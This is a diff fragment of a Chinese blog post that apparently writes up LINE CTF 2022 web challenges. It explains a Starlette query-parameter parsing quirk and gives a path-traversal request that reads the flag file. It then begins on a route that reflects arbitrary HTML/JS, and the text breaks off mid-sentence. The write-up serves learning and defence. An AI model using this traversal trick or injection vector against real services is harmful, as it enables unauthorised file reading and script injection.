request.query_params[clientId]</span><br><span class="line">        path = <span class="string">&#x27;./memo/&#x27;</span> + <span class="string">&quot;&quot;</span>.join(request.query_params.keys()) + <span class="string">&#x27;/&#x27;</span> +  filename</span><br><span class="line">        </span><br><span class="line">        f = <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        contents = f.readlines()</span><br><span class="line">        f.close()</span><br><span class="line">        </span><br><span class="line">        context[<span class="string">&#x27;filename&#x27;</span>] = filename</span><br><span class="line">        context[<span class="string">&#x27;contents&#x27;</span>] = contents</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> templates.TemplateResponse(<span class="string">&#x27;/view/view.html&#x27;</span>, context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getClientID</span>(<span class="params">ip</span>):</span></span><br><span class="line">    key = ip + <span class="string">&#x27;_&#x27;</span> + os.getenv(<span class="string">&#x27;SALT&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(key.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line">routes = [</span><br><span class="line">    Route(<span class="string">&#x27;/&#x27;</span>, endpoint=index),</span><br><span class="line">    Route(<span class="string">&#x27;/view&#x27;</span>, endpoint=view),</span><br><span class="line">    Route(<span class="string">&#x27;/reset&#x27;</span>, endpoint=reset),</span><br><span class="line">    Route(<span class="string">&#x27;/save&#x27;</span>, endpoint=save),</span><br><span class="line">    Mount(<span class="string">&#x27;/static&#x27;</span>, StaticFiles(directory=<span class="string">&#x27;./static&#x27;</span>), name=<span class="string">&#x27;static&#x27;</span>)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">app = Starlette(debug=<span class="literal">False</span>, routes=routes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    logging.info(<span class="string">&quot;Starting Starlette Server&quot;</span>)</span><br><span class="line">    uvicorn.run(app, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">11000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>逻辑很常规，文件名通过ip和SALT加密，将contents内容存储在/memo/getClientID(request.client.host)下，无xss过滤，但没什么用</p>
+<p>通过dockerfile</p>
+<figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="bash"> flag <span class="string">&quot;<span class="variable">$&#123;MEMO&#125;</span>/memo/flag&quot;</span></span></span><br></pre></td></tr></table></figure>
+<p>flag在memo下，而刚好有个路由能查看文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>(<span class="params">request</span>):</span></span><br><span class="line">    context = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        context[<span class="string">&#x27;request&#x27;</span>] = request</span><br><span class="line">        clientId = getClientID(request.client.host)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;&amp;&#x27;</span> <span class="keyword">in</span> request.url.query <span class="keyword">or</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> request.url.query <span class="keyword">or</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> unquote(request.query_params[clientId]):</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line">        </span><br><span class="line">        filename = request.query_params[clientId]</span><br><span class="line">        path = <span class="string">&#x27;./memo/&#x27;</span> + <span class="string">&quot;&quot;</span>.join(request.query_params.keys()) + <span class="string">&#x27;/&#x27;</span> +  filename</span><br><span class="line">        </span><br><span class="line">        f = <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        contents = f.readlines()</span><br><span class="line">        f.close()</span><br><span class="line">        </span><br><span class="line">        context[<span class="string">&#x27;filename&#x27;</span>] = filename</span><br><span class="line">        context[<span class="string">&#x27;contents&#x27;</span>] = contents</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> templates.TemplateResponse(<span class="string">&#x27;/view/view.html&#x27;</span>, context)</span><br></pre></td></tr></table></figure>
+<p>这个函数会检测unquote(request.query_params[clientId])里是否有. request.url.query里是否有’和&amp;(这个可以用url编码绕过)</p>
+<p>然后将request.query_params.keys()拼接在一起作为路径</p>
+<p>这里非常奇怪，既然存储路径是getClientID(request.client.host)，为什么要用””.join(request.query_params.keys())，于是将关注点放到了query_params.keys()和query_params[]</p>
+<p>在github上，我找到了这样一个例子</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> starlette.testclient <span class="keyword">import</span> TestClient</span><br><span class="line"><span class="keyword">from</span> starlette.requests <span class="keyword">import</span> Request</span><br><span class="line"><span class="keyword">from</span> starlette.applications <span class="keyword">import</span> Starlette</span><br><span class="line"><span class="keyword">from</span> starlette.routing <span class="keyword">import</span> Route</span><br><span class="line"><span class="keyword">from</span> starlette.responses <span class="keyword">import</span> PlainTextResponse</span><br><span class="line"></span><br><span class="line">param_value = <span class="string">&#x27;a;b;c&#x27;</span></span><br><span class="line">url = <span class="string">f&#x27;/test?param=<span class="subst">&#123;param_value&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">test_route</span>(<span class="params">request: Request</span>):</span></span><br><span class="line">    param = request.query_params[<span class="string">&#x27;param&#x27;</span>]</span><br><span class="line">    <span class="comment"># param is &#x27;a&#x27;</span></span><br><span class="line">    <span class="comment"># request.query_params.keys() is [&#x27;param&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]</span></span><br><span class="line">    <span class="keyword">assert</span> param == param_value  <span class="comment"># Assertion failed</span></span><br><span class="line">    <span class="keyword">return</span> PlainTextResponse(param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Starlette(debug=<span class="literal">True</span>, routes=[Route(<span class="string">&#x27;/test&#x27;</span>, test_route)])</span><br><span class="line"></span><br><span class="line">client = TestClient(app)</span><br><span class="line"></span><br><span class="line">response = client.request(url=url, method=<span class="string">&#x27;GET&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这个例子展示了当value以;分割后，query_params会截取;前半部分,而query_params.keys()会将key和a;后面的b,c当作key。这正是我们需要的。</p>
+<p>回到题目。我们便可以得出答案</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/view?CLIENT_ID=flag;/%2e%2e/</span><br></pre></td></tr></table></figure>
+
+<p>拼接后的路径变为 ./memo/CLIENT_ID/../flag，便可以读取flag</p>
+<h2 id="0x03-online-library"><a href="#0x03-online-library" class="headerlink" title="0x03 online library"></a>0x03 online library</h2><p>typescript审计，同样给出了源码</p>
+<p>先让我们将目光放到接受输入的路由上</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">&quot;/report&quot;</span>, (req: Express.Request, <span class="attr">res</span>: Express.Response): <span class="function"><span class="params">void</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.session.username) &#123;</span><br><span class="line">        <span class="keyword">const</span> code: <span class="built_in">string</span> = <span class="built_in">Math</span>.random().toString(<span class="number">36</span>).substr(<span class="number">2</span>, <span class="number">10</span>)</span><br><span class="line">        req.session.captcha = code</span><br><span class="line">        TextToImage.generate(code, &#123;</span><br><span class="line">            <span class="attr">textAlign</span>: <span class="string">&quot;center&quot;</span>,</span><br><span class="line">            <span class="attr">textColor</span>: <span class="string">&quot;#FFFFFF&quot;</span>,</span><br><span class="line">            <span class="attr">bgColor</span>: <span class="string">&quot;#00B900&quot;</span>,</span><br><span class="line">            <span class="attr">maxWidth</span>: <span class="number">300</span></span><br><span class="line">        &#125;).then(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">            res.render(<span class="string">&quot;report&quot;</span>, &#123; data &#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.render(<span class="string">&quot;identify&quot;</span>, &#123; <span class="attr">length</span>: total.length &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/report&quot;</span>, (req: Express.Request, <span class="attr">res</span>: Express.Response): <span class="function"><span class="params">void</span> =&gt;</span> &#123;</span><br><span class="line">    res.set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (!req.session.username) &#123;</span><br><span class="line">        res.json(&#123;</span><br><span class="line">            <span class="attr">error</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&quot;You are not identified.&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.session.captcha != <span class="string">&quot;&quot;</span> &amp;&amp; req.body.captcha == req.session.captcha) &#123;</span><br><span class="line">        req.session.captcha = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> req.body.url === <span class="string">&quot;string&quot;</span> &amp;&amp; req.body.url.startsWith(<span class="string">&quot;/&quot;</span>) &amp;&amp; req.body.url.length &lt; <span class="number">500</span>) &#123;</span><br><span class="line">            redis.lpush(<span class="string">&quot;query&quot;</span>, req.body.url)</span><br><span class="line">            res.json(&#123;</span><br><span class="line">                <span class="attr">error</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="attr">message</span>: <span class="string">&quot;Reported successfully.&quot;</span></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.json(&#123;</span><br><span class="line">                <span class="attr">error</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="attr">message</span>: <span class="string">&quot;Invalid url.&quot;</span>,</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.json(&#123;</span><br><span class="line">            <span class="attr">error</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&quot;Invalid captcha.&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>只有属于nodejs domain的URL才能post，被admin查看。</p>
+<p>而在insert函数里</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">&quot;/insert&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> req.body.title === <span class="string">&quot;string&quot;</span> &amp;&amp;</span><br><span class="line">        req.body.title.length &lt; <span class="number">30</span> &amp;&amp;</span><br><span class="line">        <span class="keyword">typeof</span> req.body.content === <span class="string">&quot;string&quot;</span> &amp;&amp;</span><br><span class="line">        req.body.content.length &lt; <span class="number">1024</span> * <span class="number">256</span>) &#123;</span><br><span class="line">        res.end(<span class="string">&quot;&lt;script&gt;document.cookie = &#x27;FLAG=REMOVED&#x27;&lt;/script&gt;&lt;h1&gt;&quot;</span>.concat(req.body.title, <span class="string">&quot;&lt;/h1&gt;&lt;hr/&gt;&quot;</span>) + req.body.content);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        res.end(<span class="string">&quot;Something wrong with your book title or contents.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>我们能在这里插入任意html/js代码，不过</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://corrupt7.github.io/2022/03/29/lineCTF2022-WEB-wp/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2022/03/31/java%E5%AE%89%E5%85%A8%E4%B9%8B%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8-ClassLoader/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          java安全之类加载器(ClassLoader)
+        
+      </div>
+    </a>
   
   
-    </div></section>
+    <a href="/2022/03/29/jndi%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">jndi注入</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -224,9 +398,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
